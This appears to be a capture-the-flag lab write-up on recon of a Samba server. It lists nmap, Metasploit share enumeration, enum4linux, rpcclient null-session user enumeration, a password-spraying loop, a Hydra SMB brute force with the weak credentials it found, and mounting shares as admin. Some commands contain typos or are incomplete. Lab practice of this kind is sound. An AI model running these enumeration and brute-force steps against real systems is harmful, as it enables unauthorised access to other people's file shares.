---
layout: post
title:  "CTFLive - Recon Samba"
postid: writeup
categories:
---
# Recon: Samba
## IP
Kali IP: 192.102.128.2

Target IP: 192.102.128.3

# Nmap Scan
$ nmap -sC -Sv -oN nmap.txt

Workgroup: RECONLABS

Found vulnerability within SMB

# SMB_enumshares Metasploit
smb_enumshares Metasploit 

```
msf > use auxiliary/scanner/smb/smb_enumshares
msf auxiliary(smb_enumshares) > show options
set RHOSTS 192.102.128.3
msf auxiliary(smb_enumshares) > run
```

Results:
public
john
aisha
emma
everyone (DISK)
IPC (samba.recon.alb)

# enum4linux
`$ enum4Linux -v 192.102.128.3`

Users:
administrator, guest, domain admins, root, bin, none

-U to see usernames
-G groups
-S shares

# rpcclient
`$ rpcclient -U "" -N 192.102.128.3`

Users:
john 0x3ee
elie 0x3ea
aisha 0x3ec
shawn 0x3e9
emma 0x3eb
admin 0x3ed

``
rpcclient $> enumdomusers
$> enumdomgroups
$> querygroup 0x###
$> querygroupmem 0x###
$> queryuser 0x###
getdompwinfo
getusrdompwinfo
```

```
rpcclient -U "jdoe%bbb" -c "getusername;quit" 192.102.128.3
rpccleint -U "jdoe%aaa" -c "getusername;quit" 192.102.128.3
```

```
for u in 'cat domain-users.txt'; do echo -n "[*] user: $u" && rpcclient -U $"$u%Autumn2015" -c "getusername;quit" 192.102.128.3
```

# Hydra
`$ hydra -L users.txt -P /usr/share/john/password.lst 192.102.128.3 smb`

Found Username/Password:
john password1
elie 123456
aisha monkey 
shawn jennifer
emma abc123
admin password

```
$ smbmount //192.102.128.3/ /mnt –o username=admin,workgroup=RECONLABS
$ \\samba-recon-admin
```

```
mount -t cifs -o username=admin //192.102.128.3/admin /mnt
mount -t cifs -o username=smbuser,password=smbpass //192.168.1.100/documents /mnt
```

samba-recon\admin\profile

`$ smbclient -U "admin%password" \\\\192.102.128.3\\admin`

# Flags:
a11##############5bf7
16b##############a6d0
2727##########721c92e
03ddb############b3b4